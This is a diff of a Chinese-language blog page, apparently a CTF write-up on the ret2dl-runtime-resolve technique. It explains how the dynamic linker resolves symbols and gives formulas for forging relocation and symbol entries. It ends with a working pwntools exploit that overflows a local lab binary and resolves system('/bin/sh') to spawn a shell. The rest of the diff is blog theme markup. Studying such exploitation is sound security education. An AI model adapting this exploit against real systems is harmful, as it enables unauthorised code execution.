 <p>再根据.dynamic的地址找到另外几个结构的地址</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220203145416583.png"
-                      alt="image-20220203145416583"
-                ></p>
+<p><img   src="/images/image-20220203145416583.png"  alt="image-20220203145416583"></p>
 <p>其中的地址信息是:</p>
 <p>.dynstr 的地址是 .dynamic + 0x44 -&gt; 0x0804821c</p>
 <blockquote>
@@ -304,37 +344,17 @@
 
 <p>.rel.plt 的地址加上参数 reloc_arg，即 0x08048298 + 0 -&gt; 0x08048298</p>
 <p>找到的就是函数的重定位表项 Elf32_Rel 的指针，记作 rel</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220203150027635.png"
-                      alt="image-20220203150027635"
-                ></p>
+<p><img   src="/images/image-20220203150027635.png"  alt="image-20220203150027635"></p>
 <p>通过rel就可以获得Elf32_Rel结构体的数据</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r_offset=<span class="number">0x0804a00c</span>;</span><br><span class="line">r_info=<span class="number">0x00000107</span>;</span><br></pre></td></tr></table></figure>
 
 <p>将r_info&gt;&gt;8得到4也就得到了.dynsym中的下标。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220203150547259.png"
-                      alt="image-20220203150547259"
-                ></p>
+<p><img   src="/images/image-20220203150547259.png"  alt="image-20220203150547259"></p>
 <p>从上往下从0开始，找到与下标相同的行获得第一列的数据根据即为name_offset</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220203163308304.png"
-                      alt="image-20220203163308304"
-                ></p>
+<p><img   src="/images/image-20220203163308304.png"  alt="image-20220203163308304"></p>
 <p>为什么是第一列是因为第一列的值其实就是上面写的偏移</p>
 <p>再根据.dynstr+name_offset获得函数名的字符串。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220203150933860.png"
-                      alt="image-20220203150933860"
-                ></p>
+<p><img   src="/images/image-20220203150933860.png"  alt="image-20220203150933860"></p>
 <p>最后再根据得到的字符串来执行函数。</p>
 <h4 id="梳理一下"><a href="#梳理一下" class="headerlink" title="梳理一下"></a>梳理一下</h4><p>1.首先push两个参数进入，随后执行_dl_runtime_resolve</p>
 <p>2.根据link_map找到.dynamic地址</p>
@@ -343,20 +363,20 @@
 <p>5.拿到r_info经过移位拿到index</p>
 <p>6.根据index拿到name_offset结合.dynstr计算出函数的名字</p>
 <blockquote>
-<p>rel_addr = .rel.plt_addr + reloc_arg</p>
-<p>fake_rel_addr = .rel.plt_addr + fake_reloc_arg</p>
-<p><strong>fake_reloc_arg = fake_rel_addr - rel_addr + reloc_arg</strong></p>
+<p>rel_addr &#x3D; .rel.plt_addr + reloc_arg</p>
+<p>fake_rel_addr &#x3D; .rel.plt_addr + fake_reloc_arg</p>
+<p><strong>fake_reloc_arg &#x3D; fake_rel_addr - rel_addr + reloc_arg</strong></p>
 <p>根据以上简单的运算就可以实现伪造rel的地址</p>
 </blockquote>
 <blockquote>
-<p>name_offset_addr=((r_info - 0x7)&gt;&gt;8)*0x10+.dynsym_addr</p>
-<p>fake_name_offset_addr=((r_info - 0x7)&gt;&gt;8)*0x10+fake_dynsym_addr</p>
-<p><strong>r_info = (((fake_dynsym_addr - .dynsym_addr) / 16) &lt;&lt; 8) + 0x7</strong></p>
+<p>name_offset_addr&#x3D;((r_info - 0x7)&gt;&gt;8)*0x10+.dynsym_addr</p>
+<p>fake_name_offset_addr&#x3D;((r_info - 0x7)&gt;&gt;8)*0x10+fake_dynsym_addr</p>
+<p><strong>r_info &#x3D; (((fake_dynsym_addr - .dynsym_addr) &#x2F; 16) &lt;&lt; 8) + 0x7</strong></p>
 <p>这里伪造出rel当中的r_info的值</p>
 </blockquote>
 <blockquote>
 <p>根据上面ida调试的截图很容易可以看出来dynsym的伪造很简单只需要按照原本的模式写就行</p>
-<p><strong>fake_dynsym = p32(system_str - dynstr_addr)+p32(0)+p32(0)+p8(0x12)+p8(0)+p16(0)</strong></p>
+<p><strong>fake_dynsym &#x3D; p32(system_str - dynstr_addr)+p32(0)+p32(0)+p8(0x12)+p8(0)+p16(0)</strong></p>
 </blockquote>
 <p>最终构造exp</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./ret2dlsolve&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2dlsolve&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_load_plt = <span class="number">0x80482d0</span></span><br><span class="line">leave_ret = <span class="number">0x08048378</span></span><br><span class="line">pop_ebp = <span class="number">0x080484ab</span></span><br><span class="line">dynstr_addr = <span class="number">0x0804821c</span></span><br><span class="line">dynsym_addr = <span class="number">0x080481cc</span></span><br><span class="line">rel_addr = <span class="number">0x08048298</span></span><br><span class="line">bss = elf.bss()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x28</span>+<span class="number">0x4</span>)+p32(pop_ebp)+p32(bss+<span class="number">0x800</span>) + \</span><br><span class="line">    p32(read_plt)+p32(leave_ret)+p32(<span class="number">0</span>)+p32(bss+<span class="number">0x800</span>)+p32(<span class="number">0x1000</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_dynsym_addr = bss+<span class="number">0x910</span></span><br><span class="line">system_str = bss+<span class="number">0x900</span></span><br><span class="line"></span><br><span class="line">fake_rel = p32(read_got) + \</span><br><span class="line">    p32((((fake_dynsym_addr - dynsym_addr) // <span class="number">16</span>) &lt;&lt; <span class="number">8</span>) + <span class="number">0x7</span>)</span><br><span class="line">fake_dynsym = p32(system_str - dynstr_addr)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p8(<span class="number">0x12</span>)+p8(<span class="number">0</span>)+p16(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_rel_addr = fake_dynsym_addr+<span class="built_in">len</span>(fake_dynsym)</span><br><span class="line">bin_sh_addr = bss+<span class="number">0x900</span>+<span class="built_in">len</span>(<span class="string">b&#x27;system\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4</span>+p32(read_load_plt)+p32(fake_rel_addr -</span><br><span class="line">                                          rel_addr)+p32(<span class="number">0</span>)+p32(bin_sh_addr)</span><br><span class="line">payload += payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>) + \</span><br><span class="line">    <span class="string">b&#x27;system\x00/bin/sh&#x27;</span>.ljust(<span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += fake_dynsym+fake_rel</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
@@ -375,12 +395,7 @@
 <p>此时的rel结构为:</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Addr        r_offset;                <span class="comment">/* Address */</span></span><br><span class="line">  Elf64_Xword        r_info;                        <span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">  Elf64_Sxword        r_addend;                <span class="comment">/* Addend */</span></span><br><span class="line">&#125; Elf64_Rela;</span><br><span class="line"><span class="comment">/* How to extract and insert information held in the r_info field.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_R_SYM(i)                        ((i) &gt;&gt; 32)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_R_TYPE(i)                        ((i) &amp; 0xffffffff)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_R_INFO(sym,type)                ((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type))</span></span><br></pre></td></tr></table></figure>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220203201328404.png"
-                      alt="image-20220203201328404"
-                ></p>
+<p><img   src="/images/image-20220203201328404.png"  alt="image-20220203201328404"></p>
 <p>在动态调试也可以看到raed在符号表中的偏移为1(0x100000007&gt;&gt;32)</p>
 <p>还有注意的就是我们需要伪造这个数组里的几个指针，它们分别是</p>
 <p>DT_STRTAB指针：位于link_map_addr +0x68(32位下是0x34)</p>
@@ -394,197 +409,285 @@
 <p><a class="link"   target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve/#second-try-no-leak" >https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve/#second-try-no-leak<i class="fas fa-external-link-alt"></i></a></p>
 <p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/jzc020121/article/details/116312592#t3" >https://blog.csdn.net/jzc020121/article/details/116312592#t3<i class="fas fa-external-link-alt"></i></a></p>
 
-        </div>
+                    
+                </div>
 
-        
-
-        
-            <div class="article-nav">
                 
-                    <div class="article-prev">
-                        <a class="prev"
-                           rel="prev"
-                           href="/2022/02/04/%E5%8A%AB%E6%8C%81TLS%E7%BB%93%E6%9E%84/"
-                        >
-                            <span class="left arrow-icon flex-center">
-                              <i class="fas fa-chevron-left"></i>
-                            </span>
-                            <span class="title flex-center">
-                                <span class="post-nav-title-item">劫持TLS结构</span>
-                                <span class="post-nav-item">上一篇</span>
-                            </span>
-                        </a>
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/ret2dl-runtime-resolve/">ret2dl-runtime-resolve</a>
+                                    </li>
+                                
+                            </ul>
+                        
                     </div>
-                
-                
-                    <div class="article-next">
-                        <a class="next"
-                           rel="next"
-                           href="/2022/01/20/V-N2020-%E5%85%AC%E5%BC%80%E8%B5%9B%E5%A4%8D%E7%8E%B0/"
-                        >
-                            <span class="title flex-center">
-                                <span class="post-nav-title-item">V&amp;N2020 公开赛复现</span>
-                                <span class="post-nav-item">下一篇</span>
-                            </span>
-                            <span class="right arrow-icon flex-center">
-                              <i class="fas fa-chevron-right"></i>
-                            </span>
-                        </a>
+                    <div>
+                        
                     </div>
-                
-            </div>
-        
+                </div>
 
-        
-            <div class="comment-container">
-                <div class="comments-container">
-    <div id="comment-anchor"></div>
-    <div class="comment-area-title">
-        <i class="fas fa-comments">&nbsp;评论</i>
+                
+                    
+
+<div class="reward-author-container border-box flex-center">
+    <div class="reward-btn border-box flex-center tooltip tooltip-img"
+            data-tooltip-img-url="/images/reward.jpg"
+            data-tooltip-img-trigger="click"
+            data-tooltip-img-style="top: -6px;"
+    >
+        <i class="fa-solid fa-mug-hot"></i>&nbsp;激励牛马，加速创作！
     </div>
-    
+</div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/2022/02/04/%E5%8A%AB%E6%8C%81TLS%E7%BB%93%E6%9E%84/"
+                                   title="劫持TLS结构"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">劫持TLS结构</span>
+                                        <span class="post-nav-item">上一篇</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2022/01/20/V-N2020-%E5%85%AC%E5%BC%80%E8%B5%9B%E5%A4%8D%E7%8E%B0/"
+                                   title="V&amp;N2020 公开赛复现"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">V&amp;N2020 公开赛复现</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+    <div class="comments-container border-box">
+        <div id="comments-anchor" class="comment-area-title border-box">
+            <i class="fas fa-comments"></i>&nbsp;评论
+        </div>
+        <div class="comment-plugin-fail border-box">
+    <span class="fail-tip">评论插件加载失败</span>
+    <button class="reload keep-button">点击重新加载</button>
+</div>
+<div class="comment-plugin-loading flex-center border-box">
+    <i class="loading-icon fa-solid fa-spinner fa-spin"></i>
+    <span class="load-tip">正在加载评论插件</span>
+</div>
+<script data-pjax>
+  window.KeepCommentPlugin = {}
+  window.KeepCommentPlugin.hideLoading = () => {
+    const cplDom = document.querySelector('.comments-container .comment-plugin-loading')
+    cplDom.style.display = 'none'
+  }
+  window.KeepCommentPlugin.loadFailHandle = () => {
+    window.KeepCommentPlugin.hideLoading()
+    const cpfDom = document.querySelector('.comments-container .comment-plugin-fail')
+    cpfDom.style.display = 'flex'
+    cpfDom.querySelector('.reload').addEventListener('click', () => {
+      window.location.reload()
+    })
+  }
+</script>
 
         
             
+
     <div class="valine-container">
-        <script 
-                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
         <div id="vcomments"></div>
-        <script >
-            function loadValine() {
-                new Valine({
-                    el: '#vcomments',
-                    appId: 'OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz',
-                    appKey: 'C672AAYGXMkHxztf8ntdLShs',
-                    meta: ['nick', 'mail', 'link'],
-                    avatar: 'wavatar',
-                    enableQQ: true,
-                    placeholder: '😜若有问题请各位大师傅留言评论',
-                    lang: 'zh-CN'.toLowerCase()
-                });
-
-                function getAuthor(language) {
-                    switch (language) {
-                        case 'en':
-                            return 'Author';
-                        case 'zh-CN':
-                            return '博主';
-                        default:
-                            return 'Master';
-                    }
-                }
-
-                // Add "Author" identify
-                const getValineDomTimer = setInterval(() => {
-                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
-                    if (vcards.length > 0) {
-                        let author = '196082';
-
-                        if (author) {
-                            for (let vcard of vcards) {
-                                const vnick_dom = vcard.querySelector('.vhead .vnick');
-                                const vnick = vnick_dom.innerHTML;
-                                if (vnick === author) {
-                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
-                                }
-                            }
-                        }
-                        clearInterval(getValineDomTimer);
-                    } else {
-                        clearInterval(getValineDomTimer);
-                    }
-                }, 2000);
+        <script 
+                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"
+                async
+                onerror="window.KeepCommentPlugin.loadFailHandle()"
+        ></script>
+        <script 
+                async
+                onerror="window.KeepCommentPlugin.loadFailHandle()"
+        >
+          window.KeepCommentPlugin.initValine = () => {
+            const config = {
+              el: '#vcomments',
+              appId: 'OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz',
+              appKey: 'C672AAYGXMkHxztf8ntdLShs',
+              meta: ['nick', 'mail', 'link'],
+              avatar: 'wavatar',
+              enableQQ: true,
+              placeholder: '😜若有问题请各位大师傅留言评论',
+              lang: 'zh-CN'.toLowerCase()
             }
 
-            if ('false') {
-                const loadValineTimeout = setTimeout(() => {
-                    loadValine();
-                    clearTimeout(loadValineTimeout);
-                }, 1000);
+            if ('') {
+              config.serverURLs = ''
+            }
+
+            if (window?.Valine) {
+              new Valine(config)
+              window.KeepCommentPlugin.hideLoading()
             } else {
-                window.addEventListener('DOMContentLoaded', loadValine);
+              setTimeout(() => {
+                window.KeepCommentPlugin.initValine()
+              }, 1000)
             }
+          }
+
+          if ('false' === 'true') {
+            setTimeout(() => {
+              window.KeepCommentPlugin.initValine()
+            }, 1200)
+          } else {
+            window.addEventListener('DOMContentLoaded', window.KeepCommentPlugin.initValine)
+          }
         </script>
     </div>
 
 
+        
+    </div>
+
+
+
+
+
+                
+            </div>
+        </div>
 
         
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2dl-runtime-resolve"><span class="nav-text">ret2dl-runtime-resolve</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#NO-RELRO"><span class="nav-text">NO_RELRO</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PARTIAL-RELRO"><span class="nav-text">PARTIAL_RELRO</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A2%B3%E7%90%86%E4%B8%80%E4%B8%8B"><span class="nav-text">梳理一下</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-text">参考链接</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+        &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2024
+        
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">196082</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
     
-</div>
-
-            </div>
         
-    </div>
-</div>
-
-
-                
-            </div>
-
-        </div>
-
-        <div class="page-main-content-bottom">
-            <footer class="footer">
-    <div class="info-container">
-        <div class="copyright-info info-item">
-            &copy;
+        <div class="deploy-info info-item">
             
-              <span>2021</span>&nbsp;-&nbsp;
+            本站由 <span class="tooltip" data-tooltip-content="GitHub Pages"><img src="/images/brands/github.png"></span> 提供部署服务
             
-            2024&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">196082</a>
         </div>
-        
-            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-            <div class="website-count info-item">
-                
-                    <span id="busuanzi_container_site_uv">
-                        访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
-                    </span>
-                
-                
-                    <span id="busuanzi_container_site_pv">
-                        总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
-                    </span>
-                
-            </div>
-        
-        <div class="theme-info info-item">
-            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
+    
+
+    
+        <div class="count-info info-item">
+            
+                <span class="count-item border-box word">
+                    <span class="item-type border-box">总字数</span>
+                    <span class="item-value border-box word">335.6k</span>
+                </span>
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">访客数</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">访问量</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
         </div>
-        
-    </div>
+    
+
+    
 </footer>
 
         </div>
     </div>
 
+    <!-- post tools -->
     
-        <div class="post-tools">
-            <div class="post-tools-container">
-    <ul class="tools-list">
-        <!-- TOC aside toggle -->
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
         
-            <li class="tools-item page-aside-toggle">
-                <i class="fas fa-outdent"></i>
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
             </li>
         
 
-        <!-- go comment -->
+        <!-- PC go comment -->
         
-            <li class="go-comment">
+            <li class="tools-item flex-center go-to-comments">
                 <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
             </li>
         
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
     </ul>
 </div>
 
         </div>
     
 
-    <div class="right-bottom-side-tools">
-        <div class="side-tools-container">
-    <ul class="side-tools-list">
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
         <li class="tools-item tool-font-adjust-plus flex-center">
             <i class="fas fa-search-plus"></i>
         </li>
@@ -593,13 +696,12 @@
             <i class="fas fa-search-minus"></i>
         </li>
 
-        <li class="tools-item tool-expand-width flex-center">
-            <i class="fas fa-arrows-alt-h"></i>
-        </li>
-
-        <li class="tools-item tool-dark-light-toggle flex-center">
-            <i class="fas fa-moon"></i>
-        </li>
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
 
         <!-- rss -->
         
@@ -613,42 +715,45 @@
             </li>
         
 
-        
-            <li class="tools-item tool-scroll-to-top flex-center">
-                <i class="fas fa-arrow-up"></i>
-            </li>
-        
-
+        <!-- to bottom -->
         <li class="tools-item tool-scroll-to-bottom flex-center">
             <i class="fas fa-arrow-down"></i>
         </li>
     </ul>
 
-    <ul class="exposed-tools-list">
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+            <li class="tools-item go-to-comments-tablet flex-center">
+                <i class="fas fa-comment"></i>
+            </li>
+        
+
         <li class="tools-item tool-toggle-show flex-center">
             <i class="fas fa-cog fa-spin"></i>
         </li>
-        
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
     </ul>
 </div>
 
     </div>
 
-    
-        <aside class="page-aside">
-            <div class="post-toc-wrap">
-    <div class="post-toc">
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2dl-runtime-resolve"><span class="nav-text">ret2dl-runtime-resolve</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#NO-RELRO"><span class="nav-text">NO_RELRO</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PARTIAL-RELRO"><span class="nav-text">PARTIAL_RELRO</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A2%B3%E7%90%86%E4%B8%80%E4%B8%8B"><span class="nav-text">梳理一下</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-text">参考链接</span></a></li></ol></li></ol>
-    </div>
-</div>
-        </aside>
-    
-
-    <div class="image-viewer-container">
-    <img src="">
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
 </div>
 
 
+    <!-- local search -->
     
         <div class="search-pop-overlay">
     <div class="popup search-popup">
@@ -666,7 +771,7 @@
                        class="search-input"
                 >
             </div>
-            <span class="popup-btn-close">
+            <span class="close-popup-btn">
                 <i class="fas fa-times"></i>
             </span>
         </div>
@@ -680,29 +785,76 @@
 
     
 
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2dl-runtime-resolve"><span class="nav-text">ret2dl-runtime-resolve</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#NO-RELRO"><span class="nav-text">NO_RELRO</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PARTIAL-RELRO"><span class="nav-text">PARTIAL_RELRO</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A2%B3%E7%90%86%E4%B8%80%E4%B8%8B"><span class="nav-text">梳理一下</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-text">参考链接</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
 </main>
 
 
 
-<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/dark-light-toggle.js"></script>
 
 
-    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/local-search.js"></script>
+<!-- common js -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/utils.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/header-shrink.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/back2top.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/toggle-theme.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/code-block.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/main.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/libs/anime.min.js"></script>
+
+<!-- local search -->
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/local-search.min.js"></script>
 
 
+<!-- lazyload -->
 
-    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/code-copy.js"></script>
-
-
-
-    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/lazyload.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/lazyload.min.js"></script>
 
 
-<div class="post-scripts">
+<div class="">
+    <!-- home page -->
     
-        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/left-side-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/toc.js"></script>
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/post/post-helper.min.js"></script>
+
+        <!-- toc -->
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/post/toc.min.js"></script>
+        
+
+        <!-- copyright-info -->
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
     
 </div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
 
 
 
